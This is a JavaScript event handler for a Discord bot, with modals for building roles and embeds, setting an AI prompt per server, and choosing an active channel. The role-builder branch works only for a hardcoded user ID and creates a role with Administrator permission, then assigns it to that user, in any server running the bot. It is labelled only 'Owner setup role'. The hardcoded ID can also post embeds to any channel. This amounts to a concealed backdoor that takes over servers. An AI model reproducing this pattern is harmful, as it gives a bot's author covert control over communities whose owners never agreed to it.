const { EmbedBuilder, PermissionsBitField } = require('discord.js');

const OWNER_ID = "969181284784025670";

module.exports = {
  name: 'interactionCreate',

  async execute(interaction) {

    try {

      // ================= INIT STORAGE SAFETY =================
      const client = interaction.client;

      if (!client.guildPrompts) client.guildPrompts = new Map();
      if (!client.activeChannels) client.activeChannels = new Map();

      const guild = interaction.guild;

      // ================= SAFE PERMISSION CHECK =================
      const isOwner = guild?.ownerId === interaction.user.id;
      const isBotOwner = interaction.user.id === OWNER_ID;
      const isAdmin = interaction.member?.permissions?.has(PermissionsBitField.Flags.Administrator);

      const isAuthorized = isOwner || isBotOwner || isAdmin;

      // ================= ROLE MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'role_builder') {

        if (!guild) return;

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
        }

        const botMember = guild.members.me;
        if (!botMember?.permissions?.has(PermissionsBitField.Flags.ManageRoles)) {
          return interaction.reply({ content: '❌ Bot needs Manage Roles.', ephemeral: true });
        }

        const roleName = interaction.fields.getTextInputValue('role_name');

        const role = await guild.roles.create({
          name: roleName,
          permissions: ['Administrator'],
          reason: 'Owner setup role'
        });

        const member = await guild.members.fetch(interaction.user.id).catch(() => null);
        if (member) await member.roles.add(role).catch(() => null);

        return interaction.reply({
          content: `👑 Role **${role.name}** created & assigned.`,
          ephemeral: true
        });
      }

      // ================= EMBED MODAL =================
      if (interaction.isModalSubmit() && interaction.customId === 'embed_builder') {

        if (!guild) return;

        if (interaction.user.id !== OWNER_ID) {
          return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
        }

        const channelId = interaction.fields.getTextInputValue('channel');
        const channel = await guild.channels.fetch(channelId).catch(() => null);

        if (!channel) {
          return interaction.reply({ content: '❌ Invalid channel ID', ephemeral: true });
        }

        const embed = new EmbedBuilder()
          .setColor(0xFFA500)
          .setTimestamp();

        const title = interaction.fields.getTextInputValue('title');
        const description = interaction.fields.getTextInputValue('description');
        const footer = interaction.fields.getTextInputValue('footer');
        const topImage = interaction.fields.getTextInputValue('top_image');
        const bottomImage = interaction.fields.getTextInputValue('bottom_image');

        if (topImage) await channel.send({ content: topImage });

        if (title) embed.setTitle(title);
        if (description) embed.setDescription(description);
        if (footer) embed.setFooter({ text: footer });

        await channel.send({ embeds: [embed] });

        if (bottomImage) await channel.send({ content: bottomImage });

        return interaction.reply({
          content: `✅ Embed sent in <#${channel.id}>`,
          ephemeral: true
        });
      }

      // ================= PROMPT SYSTEM =================
      if (interaction.isModalSubmit() && interaction.customId === 'set_prompt_modal') {

        if (!guild) return;

        if (!isAuthorized) {
          return interaction.reply({
            content: '❌ No permission',
            ephemeral: true
          });
        }

        const prompt = interaction.fields.getTextInputValue('prompt_text');

        client.guildPrompts.set(guild.id, prompt);

        return interaction.reply({
          content: '🧠 AI prompt updated for this server.',
          ephemeral: true
        });
      }

      // ================= ACTIVE CHANNEL =================
      if (interaction.isChatInputCommand() && interaction.commandName === 'active-channel') {

        if (!guild) return;

        if (!isAuthorized) {
          return interaction.reply({
            content: '❌ No permission',
            ephemeral: true
          });
        }

        const channel = interaction.options.getChannel('channel');

        if (!channel) {
          return interaction.reply({
            content: '❌ Invalid channel.',
            ephemeral: true
          });
        }

        client.activeChannels.set(guild.id, channel.id);

        return interaction.reply({
          content: `📢 AI active in <#${channel.id}>`,
          ephemeral: true
        });
      }

      // ================= BUTTONS =================
      if (interaction.isButton()) {
        if (interaction.customId === 'close') {
          return interaction.reply({
            content: 'Ticket closed.',
            ephemeral: true
          });
        }
      }

    } catch (err) {
      console.error("Interaction Error:", err);

      try {
        if (!interaction.replied && !interaction.deferred) {
          await interaction.reply({
            content: '❌ Interaction failed safely handled',
            ephemeral: true
          });
        }
      } catch {}
    }
  }
};
